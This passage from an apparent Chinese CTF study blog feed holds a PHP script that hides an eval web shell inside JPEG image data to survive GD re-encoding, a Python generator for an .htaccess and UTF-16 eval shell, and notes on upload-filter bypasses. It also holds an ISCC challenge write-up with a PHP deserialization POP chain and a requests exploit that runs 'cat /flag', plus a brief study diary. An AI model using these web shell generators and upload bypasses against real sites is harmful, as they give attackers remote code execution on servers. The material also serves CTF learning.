class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>生成payload_2.jpg，上传这张图片，然后即可执行命令</p><h3 id="上传zip"><a href="#上传zip" class="headerlink" title="上传zip"></a>上传zip</h3><p><img src="8.png" alt="image-20211207135754757"></p><p>将image改为file，上传zip，在zip的结尾添加&lt;?php eval($_POST[1]);?&gt;</p><h3 id="上传-htaccess"><a href="#上传-htaccess" class="headerlink" title="上传.htaccess"></a>上传.htaccess</h3><h3 id="如果原来使用utf8编码，可以使用utf16绕过"><a href="#如果原来使用utf8编码，可以使用utf16绕过" class="headerlink" title="如果原来使用utf8编码，可以使用utf16绕过"></a>如果原来使用utf8编码，可以使用utf16绕过</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#如果原来使用utf8编码，可以使用utf16绕过</span></span><br><span class="line">SIZE_HEADER = <span class="string">b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span>(<span class="params">filename, script</span>):</span></span><br><span class="line">    phpfile = <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    phpfile.write(script.encode(<span class="string">&#x27;utf-16be&#x27;</span>))</span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line">    phpfile.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span>():</span></span><br><span class="line">    htaccess = <span class="built_in">open</span>(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;AddType application/x-httpd-php .lethe\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.multibyte 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.detect_unicode 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value display_errors 1\n&#x27;</span>)</span><br><span class="line">    htaccess.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    generate_htacess()</span><br><span class="line"></span><br><span class="line">    generate_php_file(<span class="string">&quot;shell.lethe&quot;</span>, <span class="string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]); die(); ?&gt;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="00进行截断"><a href="#00进行截断" class="headerlink" title="%00进行截断"></a>%00进行截断</h3><p>使用类型抓到包后可以看到upload上传路径才可以</p><h3 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h3><p>上传1.php.txtxttt</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>which-is-true-iscc</title>
      <link href="/2021/05/05/which-is-true-iscc/"/>
      <url>/2021/05/05/which-is-true-iscc/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><p>源码</p><pre><code>&lt;?phpsession_start();ini_set(&#39;max_execution_time&#39;, &#39;5&#39;);set_time_limit(5);$status = &quot;new&quot;;$cmd = &quot;whoami&quot;;$is_upload = false;$is_unser_finished = false;$iscc_file = NULL;class ISCC_Upload &#123;    function __wakeup() &#123;        global $cmd;        global $is_upload;        $cmd = &quot;whoami&quot;;        $_SESSION[&#39;name&#39;] = randstr(14);        $is_upload = (count($_FILES) &gt; 0);&#125;function __destruct() &#123;    global $is_upload;    global $status;    global $iscc_file;    $status = &quot;upload_fail&quot;;    if ($is_upload) &#123;        foreach ($_FILES as $key =&gt; $value)            $GLOBALS[$key] = $value;        if(is_uploaded_file($iscc_file[&#39;tmp_name&#39;])) &#123;            $check = @getimagesize($iscc_file[&quot;tmp_name&quot;]);            if($check !== false) &#123;                $target_dir = &quot;/var/tmp/&quot;;                $target_file = $target_dir . randstr(10);                if (file_exists($target_file)) &#123;                    echo &quot;想啥呢？有东西了……&lt;br&gt;&quot;;                    finalize();                    exit;                &#125;                if ($iscc_file[&quot;size&quot;] &gt; 500000) &#123;                    echo &quot;东西塞不进去~&lt;br&gt;&quot;;                    finalize();                    exit;                &#125;                if (move_uploaded_file($iscc_file[&quot;tmp_name&quot;], $target_file)) &#123;                    echo &quot;我拿到了！&lt;br&gt;&quot;;                    $iscc_file = $target_file;                    $status = &quot;upload_ok&quot;;                &#125; else &#123;                    echo &quot;拿不到:(&lt;br&gt;&quot;;                    finalize();                    exit;                &#125;            &#125; else &#123;                finalize();                exit;            &#125;        &#125; else &#123;            echo &quot;你真是个天才!&lt;br&gt;&quot;;            finalize();            exit;        &#125;    &#125;&#125;&#125;class ISCC_ResetCMD &#123;protected $new_cmd = &quot;echo &#39;新新世界，发号施令!&#39;&quot;;function __wakeup() &#123;    global $cmd;    global $is_upload;    global $status;    $_SESSION[&#39;name&#39;] = randstr(14);    $is_upload = false;    if(!isset($this-&gt;new_cmd)) &#123;        $status = &quot;error&quot;;        $error = &quot;你这罐子是空的!&quot;;        throw new Exception($error);    &#125;    if(!is_string($this-&gt;new_cmd)) &#123;        $status = &quot;error&quot;;        $error = &#39;东西都没给对!&#39;;        throw new Exception($error);    &#125;&#125;function __destruct() &#123;    global $cmd;    global $status;    $status = &quot;reset&quot;;    if($_SESSION[&#39;name&#39;] === &#39;isccIsCciScc1scc&#39;) &#123;        $cmd = $this-&gt;new_cmd;    &#125;&#125;&#125;class ISCC_Login &#123;function __wakeup() &#123;    $this-&gt;login();&#125;function __destruct() &#123;    $this-&gt;logout();&#125;function login() &#123;    $flag = file_get_contents(&quot;/flag&quot;);    $pAssM0rd = hash(&quot;sha256&quot;, $flag);    if($_GET[&#39;pAssM0rd&#39;] === $pAssM0rd)        $_SESSION[&#39;name&#39;] = &quot;isccIsCciScc1scc&quot;;&#125;function logout() &#123;    global $status;    unset($_SESSION[&#39;name&#39;]);    $status = &quot;finish&quot;;&#125;&#125;class ISCC_TellMeTruth &#123;function __wakeup() &#123;    if(!isset($_SESSION[&#39;name&#39;]))        $_SESSION[&#39;name&#39;] = randstr(14);    echo &quot;似乎这个 &quot;.$_SESSION[&#39;name&#39;].&quot; 是真相&lt;br&gt;&quot;;&#125;function __destruct() &#123;    echo &quot;似乎这个 &quot;.$_SESSION[&#39;name&#39;].&quot; 是真相&lt;br&gt;&quot;;&#125;&#125;class ISCC_Command &#123;function __wakeup() &#123;    global $cmd;    global $is_upload;    $_SESSION[&#39;name&#39;] = randstr(14);    $is_upload = false;    $cmd = &quot;whoami&quot;;&#125;function __toString() &#123;    global $cmd;    return &quot;看看你干的好事: &#123;$cmd&#125; &lt;br&gt;&quot;;&#125;function __destruct() &#123;    global $cmd;    global $status;    global $is_unser_finished;    $status = &quot;cmd&quot;;    if($is_unser_finished === true) &#123;        echo &quot;看看你干的 [&lt;span style=&#39;color:red&#39;&gt;&#123;$cmd&#125;&lt;/span&gt;] 弄出了什么后果: &quot;;        echo &quot;&lt;span style=&#39;color:blue&#39;&gt;&quot;;        @system($cmd);        echo &quot;&lt;/span&gt;&quot;;    &#125;&#125;&#125;function randstr($len)&#123;$characters = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#39;;$randstring = &#39;&#39;;for ($i = 0; $i &lt; $len; $i++) &#123;    $randstring .= $characters[rand(0, strlen($characters))];&#125;return $randstring;&#125;function waf($s) &#123;if(stripos($s, &quot;*&quot;) !== FALSE)    return false;return true;&#125;function finalize() &#123;$cmd = &quot;&quot;;$is_upload = false;unset($_SESSION);@unlink($iscc_file);$status = &quot;finish&quot;;echo &quot;&lt;img src=&#39;whichisthetrueiscc.gif&#39;&gt;&lt;br&gt;&quot;;&#125;if(isset($_GET[&#39;whatareyounongshane&#39;])) &#123;$whatareyounongshane = $_GET[&#39;whatareyounongshane&#39;];switch ($whatareyounongshane) &#123;    case &quot;src&quot;:        highlight_file(__FILE__);        break;    case &quot;cmd&quot;:        echo &quot;想越级干好事？还是有门的……&quot;;        header(&#39;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#39;);        break;    case &quot;reset&quot;:        echo &quot;几辈子积累的好运就在这时~:p&quot;;        header(&#39;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#39;);        break;    case &quot;upload&quot;:        $resp = &lt;&lt;&lt;EOF&lt;form action=&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;  &lt;input type=&quot;file&quot; name=&quot;iscc_file&quot;&gt;  &lt;input type=&quot;submit&quot; value=&quot;Upload Image&quot; name=&quot;submit&quot;&gt;&lt;/form&gt;EOF;        echo $resp;        break;    case &quot;tellmetruth&quot;:        echo base64_decode(&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;);        header(&#39;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#39;);        break;    default:        echo &quot;空空如也就是我！&quot;;&#125;finalize();die(&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;);&#125;if(isset($_GET[&#39;?&#39;])) &#123;$wtf = waf($_GET&#123;&#39;?&#39;&#125;) ? $_GET[&#39;?&#39;] : (finalize() &amp;&amp; die(&quot;试试就“逝世”!&quot;));if($goodshit = @unserialize($wtf)) &#123;    $is_unser_finished = true;&#125;if(in_array($status, array(&#39;new&#39;, &#39;cmd&#39;, &#39;upload_ok&#39;, &#39;upload_fail&#39;, &#39;reset&#39;), true))    finalize();die(&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;);&#125;?&gt;</code></pre><p>说实话这个源码一下子都给我看害怕了这也太长了吧。。。。</p><p>先找到漏洞在得地方</p><pre><code>class ISCC_Command &#123;function __wakeup() &#123;    global $cmd;    global $is_upload;    $_SESSION[&#39;name&#39;] = randstr(14);    $is_upload = false;    $cmd = &quot;whoami&quot;;&#125;function __toString() &#123;    global $cmd;    return &quot;看看你干的好事: &#123;$cmd&#125; &lt;br&gt;&quot;;&#125;function __destruct() &#123;    global $cmd;    global $status;    global $is_unser_finished;//10,247    $status = &quot;cmd&quot;;    if($is_unser_finished === true) &#123;        echo &quot;看看你干的 [&lt;span style=&#39;color:red&#39;&gt;&#123;$cmd&#125;&lt;/span&gt;] 弄出了什么后果: &quot;;        echo &quot;&lt;span style=&#39;color:blue&#39;&gt;&quot;;        @system($cmd);        echo &quot;&lt;/span&gt;&quot;;    &#125;&#125;&#125;</code></pre><p>我们是想找到我们想要的flag，所以我们就应该改变cmd得值，cmd是一个全局变量，所以尝试查找哪里cmd得值发生改变</p><pre><code>class ISCC_ResetCMD &#123;protected $new_cmd = &quot;echo &#39;新新世界，发号施令!&#39;&quot;;function __wakeup() &#123;    global $cmd;    global $is_upload;    global $status;    $_SESSION[&#39;name&#39;] = randstr(14);    $is_upload = false;    if(!isset($this-&gt;new_cmd)) &#123;        $status = &quot;error&quot;;        $error = &quot;你这罐子是空的!&quot;;        throw new Exception($error);       &#125;    if(!is_string($this-&gt;new_cmd)) &#123;        $status = &quot;error&quot;;        $error = &#39;东西都没给对!&#39;;        throw new Exception($error);    &#125;&#125;function __destruct() &#123;    global $cmd;    global $status;    $status = &quot;reset&quot;;    if($_SESSION[&#39;name&#39;] === &#39;isccIsCciScc1scc&#39;) &#123;        $cmd = $this-&gt;new_cmd;    &#125;&#125;&#125;</code></pre><p>应该是这里发生了变化，我们可以通过改变new_cmd来改变cmd，但是改变new_cmd得值需要我们使得$_SESSION[‘name’]=isccIsCciScc1scc，所以我们现在要做的就是怎么改变$_SESSION[‘name’]，因为初始得时候session得值是14位随机数</p><pre><code>class ISCC_Login &#123;function __wakeup() &#123;    $this-&gt;login();&#125;function __destruct() &#123;    $this-&gt;logout();&#125;function login() &#123;    $flag = file_get_contents(&quot;/flag&quot;);    $pAssM0rd = hash(&quot;sha256&quot;, $flag);    if($_GET[&#39;pAssM0rd&#39;] === $pAssM0rd)        $_SESSION[&#39;name&#39;] = &quot;isccIsCciScc1scc&quot;;&#125;function logout() &#123;    global $status;    unset($_SESSION[&#39;name&#39;]);    $status = &quot;finish&quot;;&#125;&#125;</code></pre><p>这里给人一种很明显得错觉，但是，我能发现的就是logout这个方法，有一个unset函数用于销毁变量，如果我们一旦使用这个类，我们得这个变量就没有了，所以一定不能调用这个类</p><p>做到这里我就卡住了</p><p>参考feng师傅得文章，说是可以在这个类中</p><p><img src="1.PNG"></p><p>现在开始构造链</p><pre><code>&lt;?phpclass ISCC_Command &#123;&#125;class ISCC_ResetCMD &#123;    protected $new_cmd = &quot;cat /flag&quot;;&#125;class ISCC_Upload &#123;&#125;$a=array(    &#39;a&#39;=&gt;new ISCC_Upload(),    &#39;b&#39;=&gt;new ISCC_ResetCMD(),    &#39;c&#39;=&gt;new ISCC_Command(),);$b=urlencode(serialize($a));$b=str_replace(&quot;s&quot;,&quot;S&quot;,$b);$b=str_replace(&quot;%2A&quot;,&#39;\2a&#39;,$b);echo $b;</code></pre><p>接下来就是$_FILES的处理了。</p><pre><code>import requestsurl=&quot;http://39.96.91.106:7050/&quot;files=&#123;    &#39;iscc_file&#39;:(&quot;b&quot;,open(&quot;1.jpg&quot;,&quot;rb&quot;)),    &quot;_SESSION&quot;:(&quot;isccIsCciScc1scc&quot;,&quot;123&quot;)&#125;headers=&#123;    &#39;Cookie&#39;:&quot;XDEBUG_SESSION=PHPSTORM&quot;&#125;r=requests.post(url=url+&quot;??=O%3A11%3A%22ISCC_Upload%22%3A1%3A%7BS%3A1%3A%22a%22%3BO%3A13%3A%22ISCC_ReSetCMD%22%3A2%3A%7BS%3A10%3A%22%00%5C2a%00new_cmd%22%3BS%3A9%3A%22cat+%2Fflag%22%3BS%3A1%3A%22b%22%3BO%3A12%3A%22ISCC_Command%22%3A0%3A%7B%7D%7D%7D&quot;,files=files,headers=headers)print(r.text)</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>周记1</title>
      <link href="/2021/05/05/%E5%91%A8%E8%AE%B01/"/>
      <url>/2021/05/05/%E5%91%A8%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><p>开始学着去记录一个每一周学习了什么进步了多少。</p><p>说实话，学习ctf到现在，我还是感觉自己很菜，马上就期末了，挺快的下一届的学弟学妹都来了，可是我还是这么的菜。。。。。。</p><p>学习jwt</p><p>但是不够深入，需要深入学习</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>easylogin</title>
